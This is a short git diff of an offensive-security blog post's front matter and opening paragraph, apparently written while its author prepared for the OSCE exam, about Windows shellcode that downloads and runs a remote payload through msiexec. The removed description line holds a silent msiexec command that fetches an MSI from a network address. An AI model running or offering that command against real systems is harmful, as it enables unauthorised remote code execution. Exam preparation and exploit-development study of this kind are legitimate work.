@@ -1,10 +1,11 @@
 ---
 layout: post
 title: WINDOWS SHELLCODE – DOWNLOAD AND EXECUTE PAYLOAD USING MSIEXEC
-description: msiexec /i http://192.168.1.3/ms.msi /qn
+excerpt_separator: <!--more-->
 ---
 
 Hello and welcome! Today I will be sharing a shellcode that came across my mind when I was preparing for my OSCE exam, so this inspired me to write and share my knowledge on how I developed a shellcode for windows to download and execute a remote payload using windows installer(msiexec.exe).
+<!--more-->
 
 The objective for this shellcode was to obtain code execution on my target machine from the following command line, also make sure that shellcode is small in size and NULL free:
 
